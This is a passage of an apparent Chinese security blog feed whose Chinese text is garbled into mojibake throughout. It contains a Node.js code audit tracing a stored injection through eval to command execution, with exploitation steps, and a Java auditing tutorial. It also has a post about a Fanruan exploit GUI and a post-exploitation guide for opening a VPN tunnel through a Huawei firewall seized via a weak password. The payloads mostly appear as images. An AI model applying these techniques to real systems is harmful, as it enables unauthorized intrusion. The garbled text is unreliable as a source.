                              V
  +-----------------------------------------------------------------+
  | getRelationNodeandLinks(resultSet, relationMap, ... , cb)        |
  +-----------------------------------------------------------------+
                              |
                              V
  +-----------------------------------------------------------------+
  | getNodevalueBynodeType(row, nodeType, regex, index, cb)          |
  +-----------------------------------------------------------------+
                              |
                              V
  +-----------------------------------------------------------------+
  | getRegexPattern(srcMessage, pattern, index)                      |
  +-----------------------------------------------------------------+
</code></pre>
<h4 id="21-getregexpattern">2.1 getRegexPattern()</h4>
<p>â€‹		æ­¤ä¸ºæœ€ç»ˆè°ƒç”¨evalçš„å‡½æ•°ï¼Œæ²¡æœ‰é™åˆ¶ï¼Œç›´æ¥å°†æ¥æ”¶çš„å‚æ•°ä¼ å…¥evalå‡½æ•°ï¼Œpayloadå‚æ•°åä¸º<strong>pattern</strong></p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403061738634.png" alt="image-20240306173844318" style="zoom:50%;" />
<h4 id="22-getnodevaluebynodetype">2.2 getNodevalueBynodeType()</h4>
<p>â€‹		æ­¤å‡½æ•°ä¸ºå½“<strong>nodeType!=1</strong>æ—¶è¿›å…¥ç›®æ ‡å‡½æ•°ï¼Œpayloadå‚æ•°åä¸º<strong>regex</strong></p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403061740880.png" alt="image-20240306173958751" style="zoom:50%;" />
<h4 id="23-getrelationnodeandlinks">2.3 getRelationNodeandLinks()</h4>
<p>â€‹		æ­¤å‡½æ•°éœ€è¦ä½¿<strong>relationMap!=1</strong>è¿›å…¥ç›®æ ‡å‡½æ•°ï¼Œpayloadå‚æ•°åä¸º<strong>relationMap.srcRegex</strong>ï¼Œæ˜¯é”®çš„å€¼</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071028876.png" alt="image-20240307102735880" style="zoom: 33%;" />
<h4 id="24-execgetnostructurenodeandlinks">2.4 execGetNostructureNodeAndLinks()</h4>
<p>â€‹		æ­¤å‡½æ•°éœ€è¦æ»¡è¶³3ä¸ªæ¡ä»¶è¿›å…¥ç›®æ ‡å‡½æ•°ï¼Œpayloadå‚æ•°åä¸º<strong>relationShips</strong> =&gt; <strong>relation</strong></p>
<ul>
<li>outPutFieldsArray.length &gt; 1</li>
<li>å­˜åœ¨/usr/local/las/program/neo4j/structure.csvæ–‡ä»¶</li>
<li>fileSize != 0</li>
</ul>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071030719.png" alt="image-20240307103029536" style="zoom: 33%;" />
<h4 id="25-routerpost">2.5 router.post</h4>
<p>â€‹		æ­¤å‡½æ•°éœ€è¦æ»¡è¶³5ä¸ªæ¡ä»¶æ‰èƒ½è¿›å…¥ç›®æ ‡å‡½æ•°</p>
<ul>
<li>èƒ½å¤Ÿæ ¹æ®_idæŸ¥å‡ºç»“æœdocs</li>
<li>docrelation == 0</li>
<li>æœåŠ¡å™¨ä¸ºlinux</li>
<li>indexArray.length &gt; 0</li>
<li>è·å¾—ç›¸åº”çš„splitrelationsBystructure()å‡½æ•°è¿”å›</li>
</ul>
<p>payloadå‚æ•°åä¾æ¬¡å˜åŒ–å¦‚ä¸‹ï¼Œå¹¶ä¸”å¯çŸ¥æˆ‘ä»¬æ§åˆ¶çš„å‚æ•°æ˜¯ç”¨æ¥æ§åˆ¶æŸ¥è¯¢çš„idï¼Œè€Œä¸æ˜¯ç›´æ¥ä¼ å…¥expï¼Œæ‰€ä»¥è¿˜éœ€è¦æ‰¾åˆ°idå¯¹åº”çš„å€¼æ˜¯æ’å…¥åˆ°æ•°æ®åº“çš„è¿‡ç¨‹</p>
<pre><code class="language-js">      req.body._id   //è·å¾—è¯·æ±‚å‚æ•°
           â†“
          s_id     //å¯¹è¯·æ±‚å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œé˜²æ­¢å‡ºç°sqlæ³¨å…¥
           â†“
   docs.relationships   //æŸ¥è¯¢ç»“æœçš„é”®
           â†“
       relations   //æŸ¥è¯¢ç»“æœçš„é”®
           â†“
resultRelation.noStructure   //ç»splitrelationsBystructureå‡½æ•°å¤„ç†åè¿”å›çš„é”®
           â†“
  noStructureRelations   //ç»splitrelationsBystructureå‡½æ•°å¤„ç†åè¿”å›çš„é”®
</code></pre>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071046228.png" alt="image-20240307104547930" style="zoom:33%;" />
<h5 id="251-splitrelationsbystructure">2.5.1 splitrelationsBystructure()</h5>
<p>â€‹		payloadå‚æ•°ä¸º<strong>relationShips</strong>ï¼Œè‹¥è¦å°†payloadæœ€ç»ˆä¿å­˜åˆ°noStructureé”®ä¸­ï¼Œéœ€æ»¡è¶³ä»¥ä¸‹æ¡ä»¶</p>
<ul>
<li>srcNodeType != 1 or dstNodeType != 1</li>
</ul>
<p>â€‹		å¹¶ä¸”é€šè¿‡è¿™é‡Œçš„é”®è°ƒç”¨ï¼Œè”åŠ¨å‰é¢çš„payloadä¼ é€’è¿‡ç¨‹ï¼Œä¹Ÿå¾—çŸ¥äº†æœ€ç»ˆä¼ å…¥evalçš„å‚æ•°ä¸ºsrcRegexï¼Œå¦‚æœåœ¨ä¸‹é¢è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨ï¼Œå°±æ˜¯relation.srcRegexï¼Œå’ŒsrcNodeTypeè¿™äº›æ˜¯åŒçº§çš„ï¼Œæ‰€ä»¥srcRegexå’ŒsrcNodeTypeè¿™äº›éƒ½æ˜¯æ’å…¥idå¯¹åº”çš„å†…å®¹ä¸­çš„é”®å</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071631491.png" alt="image-20240307163104008" style="zoom:50%;" />
<h5 id="252-é€šè¿‡å‰ç«¯å®šä½æ·»åŠ å…³ç³»è§„åˆ™åŠŸèƒ½">2.5.2 é€šè¿‡å‰ç«¯å®šä½æ·»åŠ å…³ç³»è§„åˆ™åŠŸèƒ½</h5>
<p>â€‹		ç”±äºéœ€è¦æ‰¾åˆ°å¦‚ä½•æ§åˆ¶idæŸ¥è¯¢ç»“æœï¼Œæ‰€ä»¥åœ¨ç½‘ç«™ä¸Šæ‰¾åˆ°ä»£ç ä¸­å¯¹åº”çš„å‰ç«¯åŠŸèƒ½ä½ç½®ï¼Œæ­¤åŠŸèƒ½æ˜¯ç”Ÿæˆå…³ç³»è§„åˆ™å›¾ï¼Œç„¶ååœ¨å‰ç«¯æ‰¾åˆ°äº†å¯¹åº”çš„æ·»åŠ å…³ç³»è§„åˆ™çš„åŠŸèƒ½ï¼Œç”±äºæ²¡ä¿å­˜å…·ä½“å›¾ç‰‡ï¼Œå£è¿°è®°å½•ä¸€ä¸‹è¿‡ç¨‹</p>
<p>â€‹		ç„¶ååœ¨å°è¯•æ–°å¢å…³ç³»æ¨¡å‹æ—¶ï¼Œå‘ç°æäº¤å¯¹åº”çš„å‚æ•°è¾“å…¥æ¡†è¢«æ³¨é‡Šäº†ï¼Œå½“æ—¶æ¢³ç†çš„è¿˜æ²¡æœ‰é‚£ä¹ˆæ¸…æ™°è¿˜æ˜¯ä»€ä¹ˆå…¶ä»–åŸå› å¯¼è‡´æ²¡åœ¨httpä¸­æ”¹åŒ…ï¼Œæ˜¯ä½¿ç”¨burpå°†è¿”å›&lt;!--æ³¨é‡Šç¬¦å·æ³¨é‡Šå’Œå…¶ä»–çš„ä¸€äº›è¿”å›åŒ…ä¿®æ”¹ï¼Œè®©æ–°å¢å…³ç³»æ¨¡å‹çš„åŠŸèƒ½é‡æ–°åœ¨å‰ç«¯æ˜¾ç¤º</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071702600.png" alt="image-20240307170246059" style="zoom:50%;" />
<p>â€‹		è·å–åˆ°æ·»åŠ å…³ç³»æ¨¡å‹çš„è·¯ç”±å’Œæ•°æ®åŒ…åï¼Œå®šä½åˆ°ä»£ç ï¼Œç¡®å®šæ— è¯¯ï¼Œå‚æ•°åéƒ½èƒ½å¯¹ä¸Šï¼Œæœ€åæ„é€ èƒ½å¤Ÿæ»¡è¶³ä»¥ä¸Šéœ€è¦æ­¥å…¥çš„ç›®æ ‡å‡½æ•°çš„æ‰€æœ‰æ¡ä»¶çš„å‚æ•°å€¼</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071719575.png" alt="image-20240307171949013" style="zoom:50%;" />
<h4 id="26-æ¼æ´åˆ©ç”¨">2.6 æ¼æ´åˆ©ç”¨</h4>
<p>æœ€ç»ˆåˆ©ç”¨è¿‡ç¨‹åˆ†ä¸ºå››æ­¥</p>
<p>1.æ·»åŠ å…³ç³»è§„åˆ™</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071729072.png" alt="image-20240307172913148" style="zoom:30%;" />
<p>2.æŸ¥è¯¢å…³ç³»è§„åˆ™ï¼Œè·å¾—ID</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071731265.png" alt="image-20240307173108052" style="zoom:30%;" />
<p>3.è°ƒç”¨IDï¼Œè§¦å‘payload</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071733803.png" alt="image-20240307173330194" style="zoom:30%;" />
<p>4.åˆ é™¤å…³ç³»è§„åˆ™ï¼Œå¦åˆ™ä¼šåœ¨æ•°æ®åº“ä¸­ç•™ä¸‹å¾ˆå¤šæ•°æ®</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071738584.png" alt="image-20240307173813160" style="zoom:30%;" />
<p>5.ç›®æ ‡ä¸å‡ºç½‘é€šè¿‡å†™å…¥æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ç»“æœè¿›è¡Œå‘½ä»¤å›æ˜¾</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403082058241.png" alt="image-20240308205846820" style="zoom:30%;" />
<h3 id="3å‘½ä»¤æ‰§è¡Œ">3.å‘½ä»¤æ‰§è¡Œ</h3>
<h4 id="31-generatetocsv">3.1 generateToCsv()</h4>
<p>â€‹		å‘½ä»¤æ‰§è¡Œæ˜¯åœ¨æ‰¾ä»£ç æ‰§è¡Œè·Ÿè¸ªè°ƒç”¨é“¾æ—¶å‘ç°çš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯åœ¨ä»£ç æ‰§è¡Œè°ƒç”¨é“¾é‚£ä¸ªexecGetNostructureNodeAndLinkså‡½æ•°ä¸­è°ƒç”¨çš„</p>
<p>â€‹		ä¼ å…¥åˆ°è¿™é‡Œçš„å‚æ•°è·Ÿè¸ªåä¼šå‘ç°æ˜¯å’Œä»£ç æ‰§è¡Œä¸­ä¼ å…¥çš„payloadæ˜¯å·®ä¸å¤šçš„ï¼Œé€šè¿‡å®¡è®¡å‘ç°åªæ˜¯ä¼ å…¥çš„å‚æ•°åæ”¹ä¸ºäº†srcLogfieldï¼Œåˆ©ç”¨è¿‡ç¨‹å°±ä¸å†™äº†ï¼Œå°±æ˜¯æ·»åŠ å…³ç³»æ—¶payloadæ”¹ä¸‹å‚æ•°</p>
<figure data-type="image" tabindex="3"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202403071757009.png" alt="image-20240307175732745" loading="lazy"></figure>
<p>0x03 æ€»ç»“</p>
<p>â€‹		æ•´ä½“å°±æ˜¯ç±»ä¼¼äºsqlçš„äºŒæ¬¡æ³¨å…¥çš„ä»£ç æ‰§è¡Œ&amp;å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå…ˆä¿å­˜payloadåˆ°æ•°æ®åº“ï¼Œåœ¨åé¢è°ƒç”¨æ•°æ®åº“æ•°æ®æ—¶è§¦å‘æ¶æ„ä»£ç ã€‚</p>
<p>â€‹		çœ‹æ–‡ç« è¯´nodejsçš„ä»£ç è¿˜å¯ä»¥å°è¯•æ‰¾åŸå‹é“¾æ±¡æŸ“è¿›è¡ŒRCEï¼Œä»¥åæœ‰éœ€è¦å†å­¦ï¼Œæœ€ååæ§½ä¸‹å…¬å¸ç»™æˆ‘ä»¬è°ƒè–ªäº†ï¼Œé«˜å…´å§ï¼Ÿæ˜¯å¾€ä¸‹è°ƒï¼å…¥èŒå‡ å¹´ï¼Œå¹´æ”¶å…¥æ¯”å…¥èŒæ—¶è¿˜ä½äº†ï¼Œè¿˜ä½äº†ï¼ŒæŠµäº†ï¼Œäº†...ğŸ¤¡</p>
<p>â€‹		å®é™…å®¡è®¡è¿‡ç¨‹è¿˜æœ‰å…¶ä»–ä¸€äº›ä¸œè¥¿ï¼Œå¤§æ¦‚å¦‚ä¸‹</p>
<ul>
<li>æ‹¿åˆ°æƒé™å‘ç°æ˜¯ä½æƒé™ç”¨æˆ·ï¼Œé€šè¿‡å…¶ä»–å‘ç°å¯åˆ©ç”¨æ¼æ´ç›´æ¥å˜æˆrootæƒé™</li>
<li>è¯·æ±‚å¿…é¡»æºå¸¦å¯¹åº”ç›®æ ‡hostçš„Referer</li>
<li>è®°ä¸æ¸…äº†ã€‚ã€‚</li>
</ul>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Javaç‚¹æ»´ | interface&implements]]></title>
        <id>https://www.svenbeast.com/post/5MkJJ8OB9/</id>
        <link href="https://www.svenbeast.com/post/5MkJJ8OB9/">
        </link>
        <updated>2024-02-02T08:40:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01-hello~interfaceimplements">0x01 Hello~ï¼ˆinterface&amp;implementsï¼‰</h2>
<p>â€‹		åœ¨Javaç¼–ç¨‹è¯­è¨€ä¸­ï¼Œinterfaceå’Œimplementsä¸¤ä¸ªå…³é”®å­—éƒ½è·Ÿé¢å‘å¯¹è±¡ç¼–ç¨‹çš„æ¦‚å¿µæœ‰å¯†åˆ‡çš„å…³ç³»ã€‚ä¸‹é¢æ˜¯å¯¹å®ƒä»¬çš„åŸºç¡€è§£é‡Šï¼š</p>
<p><strong>interface</strong>ï¼šåœ¨Javaä¸­ï¼Œæ¥å£ï¼ˆinterfaceï¼‰æ˜¯ä¸€ç§å¼•ç”¨ç±»å‹ï¼Œè·Ÿç±»ï¼ˆclassï¼‰æ˜¯åŒçº§çš„ç»“æ„ã€‚å®ƒæ˜¯ä¸€ç§å®Œå…¨æŠ½è±¡çš„ç±»å‹ï¼Œç”¨äºå®šä¹‰å¯¹è±¡ä¹‹é—´çš„çº¦å®šæˆ–è¡Œä¸ºè§„èŒƒã€‚æ¥å£ä¸­å¯ä»¥å®šä¹‰æŠ½è±¡æ–¹æ³•å’Œå¸¸é‡ï¼Œä½†ä¸èƒ½åŒ…å«æ™®é€šæ–¹æ³•ï¼ˆé™¤éæ˜¯Java 8ä¹‹åå¼•å…¥çš„defaultæ–¹æ³•å’Œé™æ€æ–¹æ³•ï¼‰ã€‚å®è´¨ä¸Šï¼Œæ¥å£æ˜¯å¯¹åŠ¨ä½œçš„æŠ½è±¡ã€‚</p>
<p><strong>implements</strong>ï¼šè¿™æ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºç±»æ¥&quot;å®ç°&quot;ä¸€ä¸ªæˆ–å¤šä¸ªæ¥å£ã€‚å½“ä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæ¥å£ï¼Œå°±æ„å‘³ç€è¿™ä¸ªç±»å¿…é¡»æä¾›æ¥å£ä¸­æ‰€æœ‰æŠ½è±¡æ–¹æ³•çš„å…·ä½“å®ç°ã€‚ä¸€ä¸ªç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œè¿™å°±æä¾›äº†ä¸€ç§å¯¹äºJavaå•ç»§æ‰¿çš„è¡¥å……æœºåˆ¶ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„æ¥å£å’Œç±»çš„ç¤ºä¾‹ï¼š</p>
<pre><code class="language-java">interface Animal {
    void eat();
    void sleep();
}

class Dog implements Animal {
    @Override
    public void eat() {
        System.out.println(&quot;The dog eats.&quot;);
    }
    
    @Override
    public void sleep() {
        System.out.println(&quot;The dog sleeps.&quot;);
    }
  
  	public void bark() {
        System.out.println(&quot;The dog barks.&quot;);
    }
}
</code></pre>
<p>â€‹		åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸ºAnimalçš„æ¥å£ï¼Œæ¥å£æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š<code>eat</code>å’Œ<code>sleep</code>ã€‚ç„¶åï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç±»Dogï¼Œè¿™ä¸ªç±»é€šè¿‡ä½¿ç”¨å…³é”®å­—<code>implements</code>æ¥å®ç°äº†Animalæ¥å£ã€‚è¿™å°±æ„å‘³ç€Dogç±»å¿…é¡»æä¾›Animalæ¥å£ä¸­æ‰€æœ‰æ–¹æ³•çš„å®ç°ã€‚</p>
<p>è¯·æ³¨æ„ï¼Œè™½ç„¶<code>Dog</code>ç±»å¿…é¡»å®ç°æ‰€æœ‰çš„<code>Animal</code>æ¥å£çš„æ–¹æ³•ï¼Œä½†è¿™å¹¶ä¸æ„å‘³ç€<code>Dog</code>ç±»ä¸èƒ½æœ‰<code>Animal</code>æ¥å£ä¹‹å¤–çš„å…¶ä»–æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œ<code>Dog</code>ç±»å¯èƒ½è¿˜æœ‰å…¶ä»–æ–¹æ³•ï¼Œå¦‚ <code>bark()</code>ï¼š</p>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä½ èƒ½å¤Ÿåœ¨<code>Dog</code>å¯¹è±¡ä¸Šè°ƒç”¨<code>bark()</code>æ–¹æ³•ï¼š</p>
<pre><code class="language-java">Dog myDog = new Dog();
myDog.bark();  // The dog barks.
</code></pre>
<p>ä½†ä½ ä¸èƒ½åœ¨<code>Animal</code>å¯¹è±¡ä¸Šè°ƒç”¨<code>bark()</code>æ–¹æ³•ï¼Œå› ä¸ºå®ƒä¸æ˜¯<code>Animal</code>æ¥å£çš„ä¸€éƒ¨åˆ†ï¼š</p>
<pre><code class="language-java">Animal myAnimal = new Dog();  // This is allowed because Dog is a subtype of Animal.
myAnimal.bark();  // This is NOT allowed.
</code></pre>
<p>åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå°½ç®¡<code>myAnimal</code>æ˜¯ä¸€ä¸ª<code>Dog</code>çš„å®ä¾‹ï¼Œä½†æ˜¯ç”±äºå…¶ç±»å‹è¢«å£°æ˜ä¸º<code>Animal</code>ï¼Œæˆ‘ä»¬åªèƒ½è°ƒç”¨åœ¨<code>Animal</code>æ¥å£ä¸­å®šä¹‰çš„æ–¹æ³•ã€‚å¦‚æœä½ éœ€è¦è°ƒç”¨<code>bark()</code>æ–¹æ³•ï¼Œå°±éœ€è¦å°†å¯¹è±¡ç±»å‹è½¬æ¢æˆ<code>Dog</code>:</p>
<pre><code class="language-java">Animal myAnimal = new Dog();  // This is allowed because Dog is a subtype of Animal.
((Dog)myAnimal).bark();  // This would be allowed because we are casting myAnimal to Dog.
</code></pre>
<p>æ€»ä½“è€Œè¨€ï¼Œä½¿ç”¨<code>interface</code>å’Œ<code>implements</code>çš„å…³é”®ç›®çš„æ˜¯åˆ›å»ºä¸€ä¸ªå¯ä»¥ç”±å¤šç§ç±»æŒ‰ç…§å…±äº«çš„è§„åˆ™è¿›è¡Œå®ç°çš„æ¶æ„ï¼Œè¿™æ ·é€šè¿‡ä½¿ç”¨å¤šæ€æ€§ï¼Œå°±å¯ä»¥ä½¿æˆ‘ä»¬çš„ä»£ç æ›´åŠ çµæ´»å’Œå¯æ‰©å±•ã€‚</p>
<h2 id="0x02-å®¡è®¡ç›¸å…³">0x02 å®¡è®¡ç›¸å…³</h2>
<p>é‚£ä¹ˆå®é™…åœ¨å®¡è®¡ä¸­è¿™ä¸ªåŸºç¡€çŸ¥è¯†åˆæ‰®æ¼”ç€ä»€ä¹ˆè§’è‰²ï¼Œè¿™é‡Œç”¨æŸä¸ªOAçš„æ¼æ´è§¦å‘ç‚¹è·Ÿè¸ªè¿‡ç¨‹è¿›è¡Œä¸¾ä¾‹ã€‚</p>
<ol>
<li>
<p>å½“ä½ æ‰¾åˆ°æ­¤æ¼æ´è·¯å¾„å…³è”çš„è°ƒç”¨æ–¹æ³•ï¼ŒonMessage()</p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202402021619408.png" alt="image-20240202161916227" loading="lazy"></figure>
</li>
<li>
<p>ç„¶åä½ æ¯æ¬¡éƒ½åˆ©ç”¨ideaè¿›è¡Œcommand+é¼ æ ‡å·¦é”®è¿›è¡Œè·Ÿè¸ªï¼Œç›´åˆ°è¿½æº¯åˆ°handleMessage()æ–¹æ³•ï¼Œå‘ç°ï¼Œå’¦ï¼Œæ€ä¹ˆæ˜¯ç©ºçš„</p>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202402021629289.png" alt="image-20240202162953739" loading="lazy"></figure>
</li>
<li>
<p>è¿™ä¸ªæ—¶å€™å¦‚æœä½ çŸ¥é“interface&amp;implementsçš„å…³ç³»ï¼Œé‚£ä¹ˆä½ å°±ä¼šå»æ‰¾å®ç°WorkspaceMessageHandlerè¿™ä¸ªæ¥å£çš„ç±»äº†ï¼Œä¹ŸçŸ¥é“ä¸ºå•¥è¦æœimplements WorkspaceMessageHandleräº†ï¼ˆå¿«æ·è·³è½¬è§æ–‡å°¾ï¼‰ã€‚</p>
<figure data-type="image" tabindex="3"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202402021636630.png" alt="image-20240202163657164" loading="lazy"></figure>
</li>
<li>
<p>æœ€ç»ˆä½ æˆåŠŸæ‰¾åˆ°äº†æ¼æ´è§¦å‘æ–¹æ³•ï¼Œè€Œä¸æ˜¯åŠè·¯å¤­æŠ˜ã€‚</p>
</li>
</ol>
<p><strong>PS: ideaå³é”®è½¬åˆ°æ¥å£å®ç°ä»£ç ï¼Œå¿«æ·é”®option+command+B</strong></p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202402021732483.png" alt="image-20240202173159324" style="zoom: 33%;" />]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Javaæ‰“åŒ… | æœ€ä¼˜ç¼©å‡jaråŒ…ä½“ç§¯]]></title>
        <id>https://www.svenbeast.com/post/Zvdet8GNt/</id>
        <link href="https://www.svenbeast.com/post/Zvdet8GNt/">
        </link>
        <updated>2024-01-29T08:39:09.000Z</updated>
        <content type="html"><![CDATA[<h2 id="0x01">0x01</h2>
<p>â€‹		å‘ç°æœ‰äººå†™äº†å¸†è½¯çš„GUIæ”¾åœ¨githubï¼Œè¯•ç”¨åè§‰å¾—å¾ˆæ–¹ä¾¿ï¼Œé‚ä¸‹è½½åå°è¯•å°†æ–°çš„åˆ©ç”¨é“¾æ·»åŠ è¿›å»ï¼Œä»¥æ–¹ä¾¿åç»­è‡ªå·±æµ‹è¯•ç”¨ï¼Œä½†æ˜¯å°†åˆ©ç”¨é“¾çš„jaråŒ…ä¾èµ–æ·»åŠ è¿›å»åï¼Œæ‰“åŒ…å‡ºæ¥çš„jaråŒ…å¤ªå¤§äº†ï¼Œæœ‰200å¤šmbï¼Œæ‰€ä»¥æƒ³ç¼©å‡ä¸‹</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202401291700435.png" alt="image-20240129164505465" style="zoom: 25%;" />
<h2 id="0x02">0x02</h2>
<p>â€‹		æœ‰äººè¯´ä¸€ä¸ªä¸€ä¸ªçœ‹ä¾èµ–ç„¶åå»åšé€‚é…ï¼Œè§‰å¾—ä¸å¤ªç°å®ï¼Œæœ€åä½¿ç”¨æ–¹æ³•å¦‚ä¸‹</p>
<ol>
<li>
<p>ä¿®æ”¹ä¾èµ–fine-third-10.0.jarä¸ºfine-third-10.0.zip</p>
</li>
<li>
<p>ä½¿ç”¨MacZip(macçš„å‹ç¼©å·¥å…·ï¼Œå…¶ä»–å‹ç¼©å·¥å…·ä¸å¯ä»¥)</p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202401291700061.png" alt="image-20240129164956096" loading="lazy"></figure>
</li>
<li>
<p>ç„¶åé€‰ä¸­ä¸éœ€è¦çš„ä¾èµ–å»ç§»é™¤ï¼Œå®é™…åˆ é™¤ä¸€äº›æ²¡ç”¨åˆ°çš„å¤§ä½“ç§¯çš„æ–‡ä»¶å¤¹å°±å¯ä»¥äº†</p>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202401291700008.png" alt="image-20240129165114544" loading="lazy"></figure>
</li>
</ol>
<h2 id="0x03">0x03</h2>
<p>ä¸€å¼€å§‹è®°å¾—ä»¥å‰å¼„è¿‡ï¼Œå°±æ˜¯æ”¹å‹ç¼©åŒ…å»ç¼©å‡ä½“ç§¯ï¼Œå…·ä½“è®°ä¸æ¸…äº†ã€‚</p>
<ul>
<li>é æ¨¡ç³Šå°è±¡å»å°è¯•ï¼Œå…ˆè¯•è§£å‹åå»åˆ é™¤æ²¡ç”¨çš„ä¾èµ–åœ¨å‹ç¼©ï¼Œä½†æ˜¯è¿™æ ·å‡ºæ¥çš„jaråŒ…ä¸èƒ½ç”¨ï¼Œideaçœ‹ç€æ€»æ˜¯å¤šä¸€å±‚è·¯å¾„</li>
<li>åæ¥æ˜¯è§£å‹åˆ é™¤ä¾èµ–åï¼Œé€‰æ‹©æ‰€æœ‰æ–‡ä»¶å¤¹åå³é”®å‹ç¼©ï¼Œä¸è¿‡è¿™æ ·çš„jaråŒ…è™½ç„¶ä¸å¤šä¸€å±‚è·¯å¾„äº†ï¼Œä½†ä¹Ÿä¸èƒ½ç”¨</li>
</ul>
<p><b>æœ€ç»ˆæ•ˆæœ</b></p>
<p>ç®€å•å®ç”¨ï¼Œ200å¤šmb =&gt; 40mbï¼Œé¡ºä¾¿æ ‡é¢˜æ”¹æˆè‡ªå·±çš„IDï¼Œå“ˆå“ˆå“ˆï¼Œæ„Ÿè°¢yecp181çš„æºç <br>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202401291701055.png" alt="image-20240129165730029" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ååˆ©ç”¨ | HUAWEIé˜²ç«å¢™VPNéš§é“åˆ©ç”¨]]></title>
        <id>https://www.svenbeast.com/post/khfIrl-fh/</id>
        <link href="https://www.svenbeast.com/post/khfIrl-fh/">
        </link>
        <updated>2023-10-07T07:50:41.000Z</updated>
        <content type="html"><![CDATA[<p>é€šè¿‡å¼±å£ä»¤æ‹¿åˆ°åä¸ºé˜²ç«å¢™çš„ç®¡ç†æƒé™æˆ–å…¶ä»–åœºæ™¯æ‹¿åˆ°ç®¡ç†æƒé™ï¼Œåç»­å¦‚ä¸‹</p>
<p><strong>1.æ–°å»ºVPN</strong></p>
<figure data-type="image" tabindex="1"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071457384.png" alt="image-20231007145742272" loading="lazy"></figure>
<p><strong>2.é€‰æ‹©LNSç±»å‹ï¼Œè¾“å…¥ä¸€äº›è¾“å…¥é¡¹ï¼Œç„¶åæ–°å»ºä¸€ä¸ªç”¨æˆ·ï¼Œè®°ä½è¿™é‡Œè®¾ç½®çš„å¯¹ç«¯éš§é“åç§°ï¼Œå®¢æˆ·ç«¯è¿æ¥æ—¶è¦ç”¨åˆ°</strong></p>
<figure data-type="image" tabindex="2"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071502693.png" alt="image-20231007150210395" loading="lazy"></figure>
<p><strong>3.è¾“å…¥åœ°å€è®¾ç½®ï¼Œè¿™é‡Œçš„IPåœ°å€è‡ªç”±è®¾ç½®ï¼Œåªè¦ä¸å’Œæ­¤é˜²ç«å¢™è®¾å¤‡çš„IPåœ¨åŒä¸€ç½‘æ®µå³å¯</strong></p>
<figure data-type="image" tabindex="3"><img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071504023.png" alt="image-20231007150457564" loading="lazy"></figure>
<p><strong>4.å®‰è£…HUAWEI SecoClientå®¢æˆ·ç«¯è¿›è¡Œè¿æ¥</strong></p>
<p><strong>æˆ‘æ˜¯Macï¼Œæ‰¾äº†ä¸‹èµ„æºï¼Œwinçš„å’Œmacçš„å®‰è£…åŒ…éƒ½å­˜åœ¨ç™¾åº¦äº‘äº†</strong></p>
<p>é“¾æ¥: https://pan.baidu.com/s/1lb1RczQuvVWeP5Pr1TwuFQ æå–ç : sven</p>
<img src="http://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202310071512306.png" alt="image-20231007151219548" style="zoom: 50%;" />
